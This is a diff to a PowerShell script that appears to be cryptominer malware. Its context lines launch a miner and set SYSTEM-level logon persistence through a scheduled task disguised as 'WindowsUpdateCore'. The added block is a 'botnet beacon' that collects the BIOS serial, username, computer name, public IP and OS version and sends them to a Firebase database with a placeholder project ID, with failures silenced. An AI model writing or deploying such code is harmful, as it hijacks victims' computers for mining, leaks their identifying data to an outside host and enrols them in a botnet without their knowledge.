@@ -53,5 +53,25 @@ Write-Host "[+] Miner launched at 35%" -ForegroundColor Green
 schtasks /create /tn "WindowsUpdateCore" /tr '\"' + $exe + '\" --background' /sc onlogon /ru SYSTEM /f /rl HIGHEST -ErrorAction SilentlyContinue
 Write-Host "[+] Persistence set (WindowsUpdateCore)" -ForegroundColor Green
 
+# ==================== BOTNET BEACON ====================
+try {
+    $hwid = (Get-WmiObject Win32_BIOS).SerialNumber + "-" + $env:COMPUTERNAME
+    $ip = (iwr "https://api.ipify.org" -UseBasicParsing).Content
+    $botData = @{
+        hwid = $hwid
+        username = $env:USERNAME
+        computer = $env:COMPUTERNAME
+        ip = $ip
+        os = [System.Environment]::OSVersion.VersionString
+        timestamp = (Get-Date -Format "o")
+        status = "miner_active"
+        version = "1.0"
+    } | ConvertTo-Json
+    $firebaseUrl = "https://YOURPROJECTID-default-rtdb.firebaseio.com/bots/$hwid.json"
+    iwr -Uri $firebaseUrl -Method Put -Body $botData -ContentType "application/json" -UseBasicParsing -ErrorAction SilentlyContinue
+    Write-Host "[+] Botnet beacon sent (Firebase)" -ForegroundColor Green
+} catch { Write-Host "[-] Beacon failed (silent)" -ForegroundColor Red }
+# ======================================================
+
 Write-Host "=== Done! ===" -ForegroundColor Green
-Start-Sleep -Seconds 5
+Start-Sleep -Seconds 3
